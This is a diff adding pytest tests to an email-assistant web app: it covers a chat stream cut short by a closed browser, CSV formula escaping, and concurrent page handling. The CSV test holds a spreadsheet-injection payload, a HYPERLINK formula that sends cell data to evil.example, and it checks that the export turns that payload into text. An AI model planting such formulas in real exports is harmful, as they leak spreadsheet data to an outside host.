@@ -3,30 +3,39 @@
 from __future__ import annotations
 
 import copy
+import csv
 import importlib.util
+import io
+import json
 import subprocess
 import sys
 import textwrap
+import threading
 import time
 from datetime import date, datetime
 from email.message import EmailMessage
 from pathlib import Path
 from zoneinfo import ZoneInfo
 
+import httpx
 import pytest
 from fastapi.testclient import TestClient
 
-from controller_inbox import cli
+from controller_inbox import assistant, cli, web
 from controller_inbox.cli import DIGEST_SENT_KEY, load_sample, watch_tick
 from controller_inbox.config import Settings
+from controller_inbox.demo import make_pdf
 from controller_inbox.digest import build_digest, digest_window
+from controller_inbox.folder_mail import ingest_folder
 from controller_inbox.overnight import RunBusy, run_lock, run_overnight
 from controller_inbox.store import Store
 from controller_inbox.web import allowed_hosts, create_app
+from liveserver import serving
 
 ROOT = Path(__file__).resolve().parent.parent
 NY = ZoneInfo("America/New_York")
 SAME = {"origin": "http://testserver"}
+PAGE = {"X-CloseDesk": "1"}
 
 
 def _eml(path: Path, *, subject: str, body: str) -> None:
@@ -251,7 +260,9 @@ def test_the_lock_holds_across_processes(settings: Settings):
     )
     child = subprocess.Popen([sys.executable, "-c", script])
     try:
-        for _ in range(200):
+        # Starting a second Python can take several seconds on a slow machine (CI's Windows).
+        deadline = time.monotonic() + 60
+        while time.monotonic() < deadline:
             if ready.exists() and ready.read_text():
                 break
             time.sleep(0.05)
@@ -305,3 +316,97 @@ def test_clear_sample_removes_every_trace_of_sample_mail(loaded: Store):
         assert conn.execute("SELECT email_id FROM embeddings").fetchall()[0][0] == "chat-c1"
         assert conn.execute("SELECT COUNT(*) FROM file_summaries").fetchone()[0] == 0
         assert conn.execute("SELECT COUNT(*) FROM fraud_log WHERE email_id = ?", (email.id,)).fetchone()[0] == 0
+
+
+# 10. A browser that goes away mid-answer: the answer so far is saved, and the model stops writing it.
+
+
+def test_an_answer_the_browser_left_is_saved_and_the_model_stops(settings: Settings, loaded: Store, monkeypatch):
+    stopped = threading.Event()
+    written: list[int] = []
+
+    def slow_model(*_args, **_kwargs):
+        try:
+            for i in range(300):
+                written.append(i)
+                yield f"part{i} "
+                time.sleep(0.02)
+        finally:
+            stopped.set()
+
+    monkeypatch.setattr(assistant, "llm_active", lambda _s: True)
+    monkeypatch.setattr(assistant, "needs_more_context", lambda _s: False)
+    monkeypatch.setattr(assistant, "stream_text", slow_model)
+    with serving(create_app(settings, loaded)) as base, httpx.Client(trust_env=False, timeout=20) as client:
+        with client.stream("POST", f"{base}/chat", headers=PAGE, json={"message": "What needs a reply?"}) as response:
+            lines = response.iter_lines()
+            chat_id = json.loads(next(lines))["id"]
+            deltas = 0
+            while deltas < 3:
+                deltas += json.loads(next(lines))["type"] == "delta"
+        # Leaving the block drops the connection, as closing the tab does.
+        assert stopped.wait(10), "the model stops when the browser goes away"
+        deadline = time.monotonic() + 10
+        while len(loaded.chat_turns(chat_id)) < 2 and time.monotonic() < deadline:
+            time.sleep(0.05)
+    assert len(written) < 300
+    asked, answer = loaded.chat_turns(chat_id)
+    assert asked["text"] == "What needs a reply?" and answer["role"] == "assistant"
+    assert answer["text"].startswith("part0 part1 part2 ")
+    assert answer["text"].endswith("(Stopped: the page closed before the answer finished.)")
+    assert answer["failed"], "an answer cut short isn't learned from"
+
+
+# 11. The actions export keeps a spreadsheet from running a subject or sender as a formula.
+
+
+def test_actions_export_writes_formulas_as_text(settings: Settings, store: Store):
+    settings.ensure_data_dir()
+    subject = '=HYPERLINK("https://evil.example/?d="&A2,"Invoice 2002")'
+    message = EmailMessage()
+    message["Subject"] = subject
+    message["From"] = "AP <+cmd@vendor.example>"
+    message["Date"] = "Mon, 05 Oct 2026 14:30:00 +0000"
+    message.set_content("Please find invoice INV-2002 attached. Amount due $1,250.00 by October 30, 2026.")
+    pdf = make_pdf([["Invoice INV-2002 Amount due $1,250.00"]])
+    message.add_attachment(pdf, maintype="application", subtype="pdf", filename="INV-2002.pdf")
+    (settings.inbox_incoming / "invoice.eml").write_bytes(bytes(message))
+    ingest_folder(store, settings)
+
+    response = TestClient(create_app(settings, store)).get("/export/actions.csv")
+    rows = list(csv.DictReader(io.StringIO(response.text)))
+    assert rows and response.headers["content-type"].startswith("text/csv")
+    assert {row["subject"] for row in rows} == {"'" + subject}
+    assert {row["sender"] for row in rows} == {"'+cmd@vendor.example"}
+    assert all(row["title"][:1] not in {"=", "+", "-", "@"} for row in rows)
+
+
+# 12. A chat answer gets ready in a worker thread, so other pages answer meanwhile.
+
+
+def test_other_pages_answer_while_a_chat_answer_gets_ready(settings: Settings, loaded: Store, monkeypatch):
+    started = threading.Event()
+    real_digest = web.build_digest
+
+    def slow_digest(*args, **kwargs):
+        started.set()
+        time.sleep(3)
+        return real_digest(*args, **kwargs)
+
+    monkeypatch.setattr(web, "build_digest", slow_digest)
+    answered: dict = {}
+
+    def ask(base: str) -> None:
+        with httpx.Client(trust_env=False, timeout=30) as client:
+            answered["chat"] = client.post(f"{base}/chat", headers=PAGE, json={"message": "What's urgent today?"})
+
+    with serving(create_app(settings, loaded)) as base, httpx.Client(trust_env=False, timeout=30) as client:
+        asking = threading.Thread(target=ask, args=(base,))
+        asking.start()
+        assert started.wait(10)
+        began = time.monotonic()
+        assert client.get(f"{base}/health").status_code == 200
+        waited = time.monotonic() - began
+        asking.join(30)
+    assert waited < 2, "other pages don't wait for a chat's setup"
+    assert answered["chat"].status_code == 200 and '"type": "done"' in answered["chat"].text
